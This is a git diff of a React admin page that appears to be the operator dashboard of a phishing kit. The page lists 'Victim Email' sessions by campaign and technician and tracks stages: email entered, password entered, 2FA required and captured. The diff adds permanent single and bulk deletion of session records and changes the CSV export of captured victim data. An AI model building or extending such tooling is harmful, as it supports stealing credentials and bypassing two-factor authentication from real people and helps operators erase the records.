@@ -2,28 +2,22 @@
 
 import { useState, useEffect } from 'react';
 import Link from 'next/link';
-import { Download, Eye, Clock, Activity, Filter, ArrowLeft } from 'lucide-react';
+import { Download, Eye, Clock, Activity, Filter, ArrowLeft, Trash2 } from 'lucide-react';
 import { formatDistanceToNow } from 'date-fns';
 import { toast } from 'sonner';
 
 interface Session {
   id: string;
-  email?: string;
-  technicianEmail?: string;
-  target: string;
+  email: string | null;
+  campaignName: string;
+  campaignId: string;
+  technicianEmail: string | null;
   stage: string;
   status: string;
-  createdAt: string;
-  updatedAt: string;
-  campaign?: {
-    id: string;
-    name: string;
-    captureId: string;
-  };
-  user?: {
-    fullName: string;
-    email: string;
-  };
+  launched: boolean;
+  createdAt?: string;
+  startedAt?: string;
+  updatedAt?: string;
 }
 
 export default function SessionsPage() {
@@ -31,6 +25,8 @@ export default function SessionsPage() {
   const [loading, setLoading] = useState(true);
   const [filter, setFilter] = useState<'all' | 'active' | 'captured' | 'failed'>('all');
   const [lastUpdated, setLastUpdated] = useState('');
+  const [selected, setSelected] = useState<Set<string>>(new Set());
+  const [confirmDelete, setConfirmDelete] = useState<{ type: 'single' | 'bulk'; id?: string; count?: number } | null>(null);
 
   useEffect(() => {
     fetchSessions();
@@ -74,6 +70,76 @@ export default function SessionsPage() {
     setLastUpdated(`${hours}:${minutes}:${seconds} UTC`);
   };
 
+  const toggleSelect = (id: string) => {
+    setSelected(prev => {
+      const next = new Set(prev);
+      next.has(id) ? next.delete(id) : next.add(id);
+      return next;
+    });
+  };
+
+  const toggleSelectAll = () => {
+    if (selected.size === sessions.length) {
+      setSelected(new Set());
+    } else {
+      setSelected(new Set(sessions.map(s => s.id)));
+    }
+  };
+
+  const handleDelete = (id: string) => {
+    setConfirmDelete({ type: 'single', id });
+  };
+
+  const handleBulkDelete = () => {
+    setConfirmDelete({ type: 'bulk', count: selected.size });
+  };
+
+  const confirmDeleteAction = async () => {
+    if (!confirmDelete) return;
+
+    try {
+      const token = localStorage.getItem('token');
+
+      if (confirmDelete.type === 'single' && confirmDelete.id) {
+        const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/sessions/${confirmDelete.id}`, {
+          method: 'DELETE',
+          headers: { Authorization: `Bearer ${token}` },
+        });
+        
+        const data = await response.json();
+        
+        if (!response.ok || !data.success) {
+          throw new Error(data.error || 'Failed to delete session');
+        }
+        
+        toast.success('Session deleted from database');
+        setSelected(prev => { const n = new Set(prev); n.delete(confirmDelete.id!); return n; });
+      } else if (confirmDelete.type === 'bulk') {
+        const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/sessions`, {
+          method: 'DELETE',
+          headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
+          body: JSON.stringify({ ids: Array.from(selected) }),
+        });
+        
+        const data = await response.json();
+        
+        if (!response.ok || !data.success) {
+          throw new Error(data.error || 'Failed to delete sessions');
+        }
+        
+        toast.success(`${selected.size} sessions permanently deleted`);
+        setSelected(new Set());
+      }
+
+      await fetchSessions();
+    } catch (error: any) {
+      console.error('Delete error:', error);
+      toast.error(error.message || 'Failed to delete sessions');
+    } finally {
+      setConfirmDelete(null);
+    }
+  };
+
   const handleExport = () => {
     try {
       if (sessions.length === 0) {
@@ -82,20 +148,19 @@ export default function SessionsPage() {
       }
 
       // Create CSV content
-      const headers = ['ID', 'Email', 'Target', 'Stage', 'Status', 'Campaign', 'Technician', 'Created At', 'Updated At'];
+      const headers = ['ID', 'Email', 'Campaign', 'Stage', 'Status', 'Technician', 'Created At', 'Updated At'];
       const csvRows = [headers.join(',')];
 
       sessions.forEach(session => {
         const row = [
           session.id,
           session.email || 'N/A',
-          extractDomain(session.target),
+          session.campaignName || 'N/A',
           session.stage,
           session.status,
-          session.campaign?.name || 'N/A',
-          session.user?.email || session.technicianEmail || 'N/A',
-          new Date(session.createdAt).toISOString(),
-          new Date(session.updatedAt).toISOString()
+          session.technicianEmail || 'N/A',
+          session.createdAt || session.startedAt ? new Date(session.createdAt || session.startedAt!).toISOString() : 'N/A',
+          session.updatedAt ? new Date(session.updatedAt).toISOString() : 'N/A'
         ];
         // Escape commas and quotes in values
         const escapedRow = row.map(val => {
@@ -128,12 +193,18 @@ export default function SessionsPage() {
     }
   };
 
-  const getDuration = (createdAt: string) => {
-    const seconds = Math.floor((new Date().getTime() - new Date(createdAt).getTime()) / 1000);
+  const getDuration = (dateStr?: string) => {
+    if (!dateStr) return '—';
+    const d = new Date(dateStr);
+    if (isNaN(d.getTime())) return '—';
+    const seconds = Math.floor((new Date().getTime() - d.getTime()) / 1000);
     const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    if (mins > 0) return `${mins}m ${secs}s`;
-    return `${secs}s`;
+    const hours = Math.floor(mins / 60);
+    const days = Math.floor(hours / 24);
+    if (days > 0) return `${days}d ago`;
+    if (hours > 0) return `${hours}h ${mins % 60}m ago`;
+    if (mins > 0) return `${mins}m ${seconds % 60}s`;
+    return `${seconds}s`;
   };
 
   const extractDomain = (url: string) => {
@@ -144,9 +215,9 @@ export default function SessionsPage() {
     }
   };
 
-  const activeSessions = sessions.filter(s => s.status === 'ACTIVE' || s.status === 'active').length;
-  const capturedSessions = sessions.filter(s => s.status === 'COMPLETED' || s.status === 'captured').length;
-  const failedSessions = sessions.filter(s => s.status === 'FAILED' || s.status === 'failed').length;
+  const activeSessions = sessions.filter(s => s.launched === true).length;
+  const capturedSessions = sessions.filter(s => s.status === 'COMPLETED').length;
+  const failedSessions   = sessions.filter(s => s.status === 'FAILED').length;
 
   return (
     <div className="mx-auto max-w-7xl p-8 space-y-6">
@@ -228,6 +299,28 @@ export default function SessionsPage() {
         </div>
       </div>
 
+      {/* Bulk Action Bar */}
+      {selected.size > 0 && (
+        <div className="flex items-center justify-between px-4 py-2.5 rounded-lg bg-[#EF4444]/10 border border-[#EF4444]/20">
+          <span className="text-sm text-[#EF4444] font-medium">{selected.size} session{selected.size > 1 ? 's' : ''} selected</span>
+          <div className="flex items-center gap-2">
+            <button
+              onClick={() => setSelected(new Set())}
+              className="text-xs text-white/50 hover:text-white px-3 py-1.5 rounded-lg transition-colors"
+            >
+              Clear
+            </button>
+            <button
+              onClick={handleBulkDelete}
+              className="flex items-center gap-1.5 px-3 py-1.5 bg-[#EF4444]/20 hover:bg-[#EF4444]/30 text-[#EF4444] rounded-lg text-xs font-medium transition-colors"
+            >
+              <Trash2 className="h-3.5 w-3.5" />
+              Delete Selected
+            </button>
+          </div>
+        </div>
+      )}
+
       {/* Sessions Table */}
       <div className="rounded-xl border border-white/10 bg-[#151823] overflow-hidden">
         {loading ? (
@@ -246,103 +339,100 @@ export default function SessionsPage() {
           <table className="w-full">
             <thead className="bg-white/5">
               <tr>
-                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Session</th>
-                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Email</th>
+                <th className="px-4 py-3 w-10">
+                  <input
+                    type="checkbox"
+                    checked={sessions.length > 0 && selected.size === sessions.length}
+                    onChange={toggleSelectAll}
+                    className="rounded border-white/20 bg-white/5 cursor-pointer"
+                  />
+                </th>
+                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Victim Email</th>
                 <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Campaign</th>
-                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Technician</th>
                 <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Stage</th>
-                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Status</th>
-                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Duration</th>
+                <th className="text-center px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Status</th>
+                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Technician</th>
+                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Age</th>
+                <th className="px-6 py-3 w-12"></th>
               </tr>
             </thead>
             <tbody className="divide-y divide-white/10">
               {sessions.map((session) => (
                 <tr key={session.id} className="hover:bg-white/5 transition-colors">
-                  <td className="px-6 py-4">
-                    <div className="font-mono text-sm text-white/70">
-                      {session.id.substring(0, 8)}
-                    </div>
+                  <td className="px-4 py-4">
+                    <input
+                      type="checkbox"
+                      checked={selected.has(session.id)}
+                      onChange={() => toggleSelect(session.id)}
+                      className="rounded border-white/20 bg-white/5 cursor-pointer"
+                    />
                   </td>
                   <td className="px-6 py-4">
-                    <div className="text-sm text-white">
-                      {session.email || 'Not captured'}
-                    </div>
+                    <span className="font-mono text-sm text-white">{session.email ?? '—'}</span>
                   </td>
                   <td className="px-6 py-4">
-                    {session.campaign ? (
-                      <div>
-                        <div className="text-sm text-white">{session.campaign.name}</div>
-                        <div className="text-xs text-white/50 font-mono mt-0.5">{session.campaign.captureId}</div>
-                      </div>
-                    ) : (
-                      <span className="text-sm text-white/50">Unknown</span>
-                    )}
+                    <span className="text-sm text-white">{session.campaignName}</span>
                   </td>
                   <td className="px-6 py-4">
-                    {session.user ? (
-                      <div>
-                        <div className="text-sm text-white">{session.user.fullName}</div>
-                        <div className="text-xs text-white/50">{session.user.email}</div>
-                      </div>
-                    ) : (
-                      <span className="text-sm text-white/70">
-                        {session.technicianEmail || 'Unknown'}
-                      </span>
-                    )}
+                    <span className="text-xs font-mono text-white/70">
+                      {session.stage === 'EMAIL_ENTERED'    ? 'Email entered'
+                       : session.stage === 'PASSWORD_ENTERED' ? 'Password entered'
+                       : session.stage === 'TWO_FA_REQUIRED'  ? '2FA required'
+                       : session.stage === 'COMPLETED'         ? 'Completed'
+                       : session.stage}
+                    </span>
                   </td>
-                  <td className="px-6 py-4">
-                    {session.stage === 'INITIATED' || session.stage === 'EMAIL_ENTERED' || session.stage === 'email' ? (
-                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#4F7FFF]/10 text-[#4F7FFF] text-xs font-medium">
-                        Email
-                      </span>
-                    ) : session.stage === 'PASSWORD_ENTERED' || session.stage === 'password' ? (
-                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#F59E0B]/10 text-[#F59E0B] text-xs font-medium">
-                        Password
-                      </span>
-                    ) : session.stage === '2FA_REQUIRED' || session.stage === '2fa' ? (
-                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#8B5CF6]/10 text-[#8B5CF6] text-xs font-medium">
-                        2FA
-                      </span>
-                    ) : session.stage === 'COMPLETED' || session.stage === 'captured' ? (
-                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#10B981]/10 text-[#10B981] text-xs font-medium">
-                        Captured
-                      </span>
-                    ) : (
-                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-white/10 text-white/50 text-xs font-medium">
-                        {session.stage}
-                      </span>
-                    )}
-                  </td>
-                  <td className="px-6 py-4">
-                    {session.status === 'ACTIVE' || session.status === 'active' ? (
+                  <td className="px-6 py-4 text-center">
+                    {session.launched === true ? (
                       <div className="flex items-center gap-2">
-                        <div className="w-2 h-2 rounded-full bg-[#10B981] animate-pulse"></div>
-                        <span className="text-xs text-[#10B981] font-medium">Live</span>
+                        <div className="w-2 h-2 rounded-full bg-[#F97316] animate-pulse"></div>
+                        <span className="text-xs text-[#F97316] font-medium">Active</span>
                       </div>
-                    ) : session.status === 'COMPLETED' || session.status === 'captured' ? (
+                    ) : session.status === 'COMPLETED' ? (
                       <div className="flex items-center gap-2">
                         <div className="w-2 h-2 rounded-full bg-[#4F7FFF]"></div>
                         <span className="text-xs text-[#4F7FFF] font-medium">Captured</span>
                       </div>
-                    ) : session.status === 'FAILED' || session.status === 'failed' ? (
+                    ) : session.status === 'PASSWORD_ENTERED' ? (
+                      <div className="flex items-center gap-2">
+                        <div className="w-2 h-2 rounded-full bg-[#F59E0B]"></div>
+                        <span className="text-xs text-[#F59E0B] font-medium">Credentials</span>
+                      </div>
+                    ) : session.status === 'EMAIL_ENTERED' ? (
+                      <div className="flex items-center gap-2">
+                        <div className="w-2 h-2 rounded-full bg-[#6366F1]"></div>
+                        <span className="text-xs text-[#6366F1] font-medium">Email Only</span>
+                      </div>
+                    ) : session.status === 'FAILED' || session.status === 'EXPIRED' ? (
                       <div className="flex items-center gap-2">
                         <div className="w-2 h-2 rounded-full bg-[#EF4444]"></div>
                         <span className="text-xs text-[#EF4444] font-medium">Failed</span>
                       </div>
                     ) : (
                       <div className="flex items-center gap-2">
-                        <div className="w-2 h-2 rounded-full bg-white/50"></div>
-                        <span className="text-xs text-white/50 font-medium">{session.status}</span>
+                        <div className="w-2 h-2 rounded-full bg-white/30"></div>
+                        <span className="text-xs text-white/40 font-medium">{session.status}</span>
                       </div>
                     )}
                   </td>
                   <td className="px-6 py-4">
-                    <div className="flex items-center gap-2">
-                      <Clock className="h-3.5 w-3.5 text-white/40" />
-                      <span className="text-sm font-mono text-white/60">
-                        {getDuration(session.createdAt)}
-                      </span>
-                    </div>
+                    <span className="text-sm text-white/50">{session.technicianEmail ?? '—'}</span>
+                  </td>
+                  <td className="px-6 py-4">
+                    <span className="text-sm text-white/50">
+                      {session.createdAt || session.startedAt 
+                        ? formatDistanceToNow(new Date(session.createdAt || session.startedAt!), { addSuffix: true })
+                        : '—'}
+                    </span>
+                  </td>
+                  <td className="px-4 py-4">
+                    <button
+                      onClick={() => handleDelete(session.id)}
+                      className="p-1.5 rounded-lg text-white/30 hover:text-[#EF4444] hover:bg-[#EF4444]/10 transition-colors"
+                      title="Delete session"
+                    >
+                      <Trash2 className="h-4 w-4" />
+                    </button>
                   </td>
                 </tr>
               ))}
@@ -363,6 +453,42 @@ export default function SessionsPage() {
           </div>
         </div>
       </div>
+
+      {/* Delete Confirmation Modal */}
+      {confirmDelete && (
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50" onClick={() => setConfirmDelete(null)}>
+          <div className="bg-[#1A1D2E] border border-white/10 rounded-xl p-6 max-w-md w-full mx-4 shadow-2xl" onClick={(e) => e.stopPropagation()}>
+            <div className="flex items-start gap-4">
+              <div className="flex-shrink-0 w-12 h-12 rounded-full bg-[#EF4444]/10 border border-[#EF4444]/20 flex items-center justify-center">
+                <Trash2 className="h-6 w-6 text-[#EF4444]" />
+              </div>
+              <div className="flex-1">
+                <h3 className="text-lg font-semibold text-white mb-2">Delete {confirmDelete.type === 'bulk' ? 'Sessions' : 'Session'}?</h3>
+                <p className="text-sm text-white/60 mb-4">
+                  {confirmDelete.type === 'bulk' 
+                    ? `Are you sure you want to permanently delete ${confirmDelete.count} selected sessions? This will remove all data from the database.`
+                    : 'Are you sure you want to permanently delete this session? This will remove all data from the database.'}
+                </p>
+                <p className="text-xs text-[#EF4444] font-medium mb-6">⚠️ This action cannot be undone.</p>
+                <div className="flex gap-3">
+                  <button
+                    onClick={() => setConfirmDelete(null)}
+                    className="flex-1 px-4 py-2.5 bg-white/5 hover:bg-white/10 border border-white/10 text-white rounded-lg text-sm font-medium transition-colors"
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    onClick={confirmDeleteAction}
+                    className="flex-1 px-4 py-2.5 bg-[#EF4444] hover:bg-[#DC2626] text-white rounded-lg text-sm font-medium transition-colors"
+                  >
+                    Delete {confirmDelete.type === 'bulk' ? 'All' : ''}
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
